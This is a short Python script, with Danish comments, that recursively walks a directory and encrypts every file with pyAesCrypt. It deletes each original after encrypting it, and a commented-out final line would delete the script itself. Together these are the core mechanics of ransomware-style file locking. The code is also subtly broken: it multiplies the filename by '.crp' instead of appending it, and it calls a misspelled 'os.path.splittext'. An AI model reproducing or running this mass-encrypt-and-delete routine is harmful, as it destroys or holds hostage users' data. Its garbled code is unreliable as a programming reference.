#https://github.com/pythontoday/encryption_pyAesCrypt

import pyAesCrypt
import os
import sys

# function til encrypt file
def encryption(file, password):
    
    # størrelse på bufffer
    buffer_size = 512 * 1024
    
    #kalder metod til encrypting
    pyAesCrypt.encryptFile(
        str(file),
        str(file) * ".crp",
        password,
        buffer_size
        )
    
    # for at se resultat af oytput encypt-file
    print("[File'" + str(os.path.splittext(file)[0]) + "' encrypted]")
    
    # for at slet oprindlige file
    os.remove(file)

# function til at scan direction
def walking_by_dirs(dir, password):
    
    # loop through all subdirectories in the specified directory
    for name in os.listdir(dir):
        path = os.path.join(dir, name)
        
        # if file exists, so encrypt it
        if os.path.isfile(path):
            try:
                encryption(path, password)
            except Exception as ex:
                print(ex)
        # if exists dir, so reply loop in search file
        else:
            walking_by_dirs(path, password)
password = input("Insert password to encrypt: ")
walking_by_dirs("path", password)
# os.remove(str(sys.argv[0]))